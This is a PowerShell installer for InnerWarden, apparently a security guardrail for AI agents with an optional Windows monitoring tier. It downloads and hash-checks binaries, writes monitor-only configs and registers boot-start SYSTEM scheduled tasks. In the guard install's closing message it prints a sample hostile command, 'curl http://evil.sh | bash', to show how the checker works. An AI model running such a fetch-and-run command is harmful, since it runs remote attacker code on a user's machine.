<#
.SYNOPSIS
  Install InnerWarden on Windows: the AI-agent guardrail (default), or the full
  host tier with -Full.

.DESCRIPTION
  Default (no -Full): downloads the signed iw-guard.exe for this machine's
  architecture, verifies its SHA-256, installs it to %LOCALAPPDATA%\Programs\
  InnerWarden, and adds that dir to the user PATH. No admin required.

  -Full (elevated): downloads the signed InnerWarden trio (sensor + agent + ctl,
  x86_64), installs to %ProgramFiles%\InnerWarden with state under
  %ProgramData%\InnerWarden, writes a Windows monitor-only config (ETW + integrity
  collectors on, responder off / dry-run), and registers two boot-start SYSTEM
  Scheduled Tasks. This is the Mac-parity light tier (spec 085); the Linux kernel
  EDR (eBPF, Execution Gate) is Linux-only and not part of the Windows build.

.PARAMETER Version
  Release tag (e.g. v0.16.0). Defaults to the latest release.

.PARAMETER Full
  Install the full sensor+agent+ctl trio + boot-start service (needs Administrator).

.EXAMPLE
  irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 | iex

.EXAMPLE
  .\install.ps1 -Full
#>
[CmdletBinding()]
param(
  [string]$Version = "latest",
  [switch]$Full
)

$ErrorActionPreference = "Stop"
$repo = "InnerWarden/innerwarden-releases"

function Get-ReleaseBase {
  param([string]$Version)
  if ($Version -eq "latest") {
    "https://github.com/$repo/releases/latest/download"
  } else {
    "https://github.com/$repo/releases/download/$Version"
  }
}

# Download an asset + its .sha256 sidecar and verify the lowercase-hex digest.
function Invoke-DownloadVerify {
  param([string]$Base, [string]$Asset, [string]$OutPath)
  Invoke-WebRequest -Uri "$Base/$Asset" -OutFile $OutPath -UseBasicParsing
  Invoke-WebRequest -Uri "$Base/$Asset.sha256" -OutFile "$OutPath.sha256" -UseBasicParsing
  $want = (Get-Content -Raw "$OutPath.sha256").Trim().ToLower()
  $got = (Get-FileHash $OutPath -Algorithm SHA256).Hash.ToLower()
  if ($want -ne $got) {
    throw "SHA-256 mismatch for $Asset`n  expected: $want`n  got:      $got"
  }
  Write-Host "  $Asset OK ($got)"
}

# Register a boot-start SYSTEM Scheduled Task with KeepAlive semantics (the
# launchd RunAtLoad+KeepAlive analog). Idempotent: unregister any prior task
# first. ExecutionTimeLimit 0 defeats Task Scheduler's 72h auto-kill; the 1-minute
# repetition (IgnoreNew) relaunches within ~1 min of any exit; RestartCount covers
# crashes. The action is wrapped in cmd /c so stdout/stderr append to a log.
function Register-InnerWardenTask {
  param([string]$Name, [string]$Exe, [string]$Arguments, [string]$Log)
  $inner = "`"$Exe`" $Arguments >> `"$Log`" 2>&1"
  $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $inner"
  $trigger = New-ScheduledTaskTrigger -AtStartup
  # PowerShell 5.1 (Server 2022) renders [TimeSpan]::MaxValue as
  # P99999999DT23H59M59S, which Register-ScheduledTask rejects ("value which is
  # incorrectly formatted or out of range"). Use a large-but-valid duration
  # (10 years) with the 1-minute interval - effectively an indefinite KeepAlive.
  $rep = (New-ScheduledTaskTrigger -Once -At (Get-Date) `
      -RepetitionInterval (New-TimeSpan -Minutes 1) `
      -RepetitionDuration (New-TimeSpan -Days 3650)).Repetition
  $trigger.Repetition = $rep
  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
  $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable `
      -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
      -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
      -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew
  Unregister-ScheduledTask -TaskName $Name -Confirm:$false -ErrorAction SilentlyContinue
  Register-ScheduledTask -TaskName $Name -Action $action -Trigger $trigger `
      -Principal $principal -Settings $settings -Force | Out-Null
  Start-ScheduledTask -TaskName $Name
}

# ── Guardrail install (default, per-user, no admin) ───────────────────────────
function Install-Guard {
  $arch = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "aarch64" } else { "x86_64" }
  $asset = "iw-guard-windows-$arch.exe"
  $base = Get-ReleaseBase $Version

  $tmp = Join-Path ([IO.Path]::GetTempPath()) ("iw-guard-" + [Guid]::NewGuid().ToString("N"))
  New-Item -ItemType Directory -Force -Path $tmp | Out-Null
  $exePath = Join-Path $tmp "iw-guard.exe"
  try {
    Write-Host "Downloading $asset ($Version)..."
    Invoke-DownloadVerify -Base $base -Asset $asset -OutPath $exePath

    $installDir = Join-Path $env:LOCALAPPDATA "Programs\InnerWarden"
    New-Item -ItemType Directory -Force -Path $installDir | Out-Null
    Copy-Item $exePath (Join-Path $installDir "iw-guard.exe") -Force
    Write-Host "Installed to $installDir\iw-guard.exe"

    $userPath = [Environment]::GetEnvironmentVariable("Path", "User")
    if (($userPath -split ';') -notcontains $installDir) {
      [Environment]::SetEnvironmentVariable("Path", "$userPath;$installDir", "User")
      Write-Host "Added $installDir to your user PATH (open a new terminal to pick it up)."
    }
    Write-Host ""
    Write-Host "Done. Try it:"
    Write-Host "  iw-guard check `"curl http://evil.sh | bash`""
    Write-Host "  iw-guard install claude-code"
  }
  finally {
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
  }
}

# ── Full trio install (elevated, boot-start service) ──────────────────────────
# The trio is built with the MSVC toolchain, which links vcruntime140.dll /
# msvcp140.dll dynamically. A fresh Windows Server does not ship them, so the
# binaries fail to start with exit 0xC0000135 (STATUS_DLL_NOT_FOUND) and the
# Scheduled Tasks flap. Install the VC++ x64 redistributable first (idempotent;
# a no-op once the CRT is present or statically linked).
function Install-VCRedist {
  if (Test-Path (Join-Path $env:SystemRoot "System32\vcruntime140.dll")) { return }
  Write-Host "Installing the Visual C++ runtime (required by the binaries)..."
  $vc = Join-Path ([IO.Path]::GetTempPath()) "vc_redist.x64.exe"
  try {
    Invoke-WebRequest -UseBasicParsing "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile $vc
    $p = Start-Process $vc -ArgumentList "/install", "/quiet", "/norestart" -Wait -PassThru
    if ($p.ExitCode -ne 0 -and $p.ExitCode -ne 3010) {
      Write-Warning "vc_redist install returned $($p.ExitCode); the binaries may fail to start."
    }
  } catch {
    Write-Warning "could not install the VC++ runtime ($($_.Exception.Message)). If the binaries fail to start (0xC0000135), install vc_redist.x64 manually."
  } finally {
    Remove-Item $vc -ErrorAction SilentlyContinue
  }
}

function Install-Full {
  $admin = ([Security.Principal.WindowsPrincipal] `
      [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
      [Security.Principal.WindowsBuiltInRole]::Administrator)
  if (-not $admin) {
    throw "install.ps1 -Full must run in an elevated (Administrator) PowerShell."
  }

  $base = Get-ReleaseBase $Version
  $prog = Join-Path $env:ProgramFiles "InnerWarden"
  $data = Join-Path $env:ProgramData "InnerWarden"
  $logs = Join-Path $data "logs"
  $dataDir = Join-Path $data "data"
  New-Item -ItemType Directory -Force -Path $prog, $data, $logs, $dataDir | Out-Null

  # Download + verify the trio (x86_64 only; aarch64 trio is not yet released).
  $tmp = Join-Path ([IO.Path]::GetTempPath()) ("iw-trio-" + [Guid]::NewGuid().ToString("N"))
  New-Item -ItemType Directory -Force -Path $tmp | Out-Null
  try {
    foreach ($bin in @("innerwarden-sensor", "innerwarden-agent", "innerwarden-ctl")) {
      $asset = "$bin-windows-x86_64.exe"
      Write-Host "Downloading $asset..."
      $out = Join-Path $tmp "$bin.exe"
      Invoke-DownloadVerify -Base $base -Asset $asset -OutPath $out
      Copy-Item $out (Join-Path $prog "$bin.exe") -Force
    }
  }
  finally {
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
  }

  # The binaries need the VC++ runtime before the Scheduled Tasks start them.
  Install-VCRedist

  # Config templates (preserve any existing as .bak). Forward-slash paths avoid
  # TOML backslash-escape issues.
  $sensorCfg = Join-Path $data "config.toml"
  $agentCfg = Join-Path $data "agent.toml"
  $dataFwd = $dataDir -replace '\\', '/'
  if (Test-Path $sensorCfg) { Copy-Item $sensorCfg "$sensorCfg.bak" -Force }
  if (Test-Path $agentCfg) { Copy-Item $agentCfg "$agentCfg.bak" -Force }

  @"
[agent]
host_id = "$env:COMPUTERNAME"

[output]
data_dir = "$dataFwd"
write_events = true

# The two real Windows host-telemetry sources (spec 085).
[collectors.windows_etw]
enabled = true

[collectors.integrity]
enabled = true
poll_seconds = 60
paths = ["C:/Windows/System32/drivers/etc/hosts"]

# Linux/macOS-only collectors: off (they read /proc,/sys and no-op on Windows).
[collectors.auth_log]
enabled = false
[collectors.macos_log]
enabled = false
[collectors.journald]
enabled = false
[collectors.exec_audit]
enabled = false
[collectors.docker]
enabled = false

[detectors.ssh_bruteforce]
enabled = true
threshold = 8
window_seconds = 300
"@ | Set-Content -Encoding utf8 $sensorCfg

  @"
# Monitor-only safe posture: no automated response until you opt in by flipping
# BOTH of these. The trio still delivers ETW telemetry -> detectors -> cloud-AI
# triage (configure a provider under [ai]) -> dashboard.
[responder]
enabled = false
dry_run = true
"@ | Set-Content -Encoding utf8 $agentCfg

  # Restrict the machine state dir to Administrators + SYSTEM (secrets-at-rest).
  & icacls $data /inheritance:r /grant:r "Administrators:(OI)(CI)F" "SYSTEM:(OI)(CI)F" | Out-Null

  # Machine PATH += the install dir.
  $machinePath = [Environment]::GetEnvironmentVariable("Path", "Machine")
  if (($machinePath -split ';') -notcontains $prog) {
    [Environment]::SetEnvironmentVariable("Path", "$machinePath;$prog", "Machine")
  }

  # Two boot-start SYSTEM tasks, EXACTLY the names ctl systemd.rs restarts/queries
  # (InnerWarden\innerwarden-{sensor,agent}).
  Write-Host "Registering boot-start Scheduled Tasks..."
  Register-InnerWardenTask -Name "InnerWarden\innerwarden-sensor" `
      -Exe (Join-Path $prog "innerwarden-sensor.exe") `
      -Arguments "--config `"$sensorCfg`"" -Log (Join-Path $logs "sensor.log")
  Register-InnerWardenTask -Name "InnerWarden\innerwarden-agent" `
      -Exe (Join-Path $prog "innerwarden-agent.exe") `
      -Arguments "--data-dir `"$dataDir`" --config `"$agentCfg`" --dashboard" `
      -Log (Join-Path $logs "agent.log")

  # Verify by process presence (Get-ScheduledTask state alone is not proof the
  # process stayed up). The task launches via `cmd /c` and the binaries spin up
  # ETW / the SQLite store / the dashboard, which takes more than a moment, so
  # poll for up to ~20s. A slow start is not fatal - the 1-minute task repetition
  # relaunches it - so warn rather than abort a successful install.
  foreach ($p in @("innerwarden-sensor", "innerwarden-agent")) {
    $up = $false
    foreach ($i in 1..10) {
      if (Get-Process $p -ErrorAction SilentlyContinue) { $up = $true; break }
      Start-Sleep -Seconds 2
    }
    if (-not $up) {
      $short = $p -replace 'innerwarden-', ''
      Write-Warning "$p is not up yet; the Scheduled Task retries every minute. Check $logs\$short.log if it does not appear."
    }
  }

  Write-Host ""
  Write-Host "InnerWarden trio installed and running (monitor-only, dry-run)."
  Write-Host "  binaries : $prog"
  Write-Host "  data     : $data"
  Write-Host "  dashboard: agent hosts it locally (see agent.log for the URL)"
  Write-Host "  next     : configure a cloud AI provider under [ai] in $agentCfg,"
  Write-Host "             then flip [responder] enabled=true + dry_run=false to act."
}

# ── Dispatch ──────────────────────────────────────────────────────────────────
if ($Full) { Install-Full } else { Install-Guard }
